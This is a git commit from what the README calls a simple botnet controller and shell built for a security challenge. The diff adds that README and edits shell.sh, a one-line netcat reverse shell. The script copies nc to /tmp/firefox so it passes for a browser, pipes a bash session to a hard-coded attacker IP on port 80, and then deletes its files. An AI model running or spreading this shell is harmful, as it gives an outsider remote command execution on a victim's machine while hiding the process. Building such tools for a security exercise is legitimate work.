b0afa211e0e0f289aea1158980d5671476187284
Mike Moss <mrmoss@alaska.edu>
2016-02-23 16:00:32 -0900

    Shell now cleans up properly.

---
+++ README.md
@@ -0,0 +1,4 @@
+Simple botnet controller and shell used in a security challenge.
+
+shell.sh - Netcat based connect out shell, shows up as firefox, currently includes an internal IP for the attacker.
+shellbot.py - Batch style botnet controller.
--- shell.sh
+++ shell.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-cp /bin/nc /tmp/netdog&&rm -f /tmp/.temp&&mkfifo /tmp/.temp&&cat /tmp/.temp|bash 2>&1|/tmp/netdog 10.250.100.108 80  >/tmp/.temp&&rm -f /tmp/.temp /tmp/netdog
+cp /bin/nc /tmp/firefox&&rm -f /tmp/.temp&&mkfifo /tmp/.temp&&cat /tmp/.temp|bash 2>&1|/tmp/firefox 10.250.100.108 80  >/tmp/.temp;rm -f /tmp/.temp /tmp/firefox
